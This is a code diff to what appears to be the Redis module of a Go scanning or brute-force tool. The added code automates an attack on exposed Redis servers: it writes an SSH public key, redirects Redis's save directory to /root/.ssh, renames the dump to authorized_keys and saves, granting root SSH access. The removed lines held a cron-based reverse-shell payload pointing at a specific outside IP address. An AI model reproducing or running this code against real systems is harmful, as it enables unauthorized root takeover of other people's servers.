@@ -2,6 +2,7 @@ package plugins
 
 import (
 	"context"
+	"fmt"
 	"github.com/go-redis/redis"
 	"strings"
 	"time"
@@ -19,8 +20,36 @@ func redisConn(parent context.Context, s *Service, _, pass string) (ok int) {
 		DB:          0,
 		DialTimeout: time.Millisecond * time.Duration(Config.TimeOut),
 	})
-	defer client.Close()
 	ctx, _ := context.WithCancel(parent)
+	defer func() {
+		if ok == OKDone || ok == OKNoAuth {
+			if !Config.Attack {
+				ret, err := client.ConfigSet(ctx, "dir", "/root/.ssh").Result()
+				s.parent.Result.ExpHelp = fmt.Sprintf("Try linux root access: '%v' error '%v'\n", ret, err)
+			} else {
+				if _, err := client.Set(ctx,
+					"OxOx", Config.SshPubKey, 10*time.Second).Result(); err != nil {
+					s.parent.Result.ExpHelp = fmt.Sprintf("Redis attack: error '%v'\n", err)
+					return
+				}
+				if _, err := client.ConfigSet(ctx, "dir", "/root/.ssh").Result(); err != nil {
+					s.parent.Result.ExpHelp = fmt.Sprintf("Redis attack: error '%v'\n", err)
+					return
+				}
+				if _, err := client.ConfigSet(ctx, "dbfilename", "authorized_keys").Result(); err != nil {
+					s.parent.Result.ExpHelp = fmt.Sprintf("Redis attack: error '%v'\n", err)
+					return
+				}
+				if _, err := client.Save(ctx).Result(); err != nil {
+					s.parent.Result.ExpHelp = fmt.Sprintf("Redis attack: error '%v'\n", err)
+					return
+				}
+				s.parent.Result.ExpHelp = "Redis attack successfully\n"
+			}
+		}
+		_ = client.Close()
+	}()
+
 	pong, err := client.Ping(ctx).Result()
 	if err == nil {
 		if strings.Contains(pong, "PONG") {
@@ -31,11 +60,6 @@ func redisConn(parent context.Context, s *Service, _, pass string) (ok int) {
 	} else {
 		if strings.Contains(err.Error(), " without any password configured") {
 			ok = OKNoAuth
-			s.parent.Result.ExpHelp = `
-set xxx "\n\n* * * * * bash -i>& /dev/tcp/104.168.147.13/6666 0>&1\n\n"
-config set dir /var/spool/cron
-config set dbfilename root
-save`
 			return
 		}
 		//账号密码错误
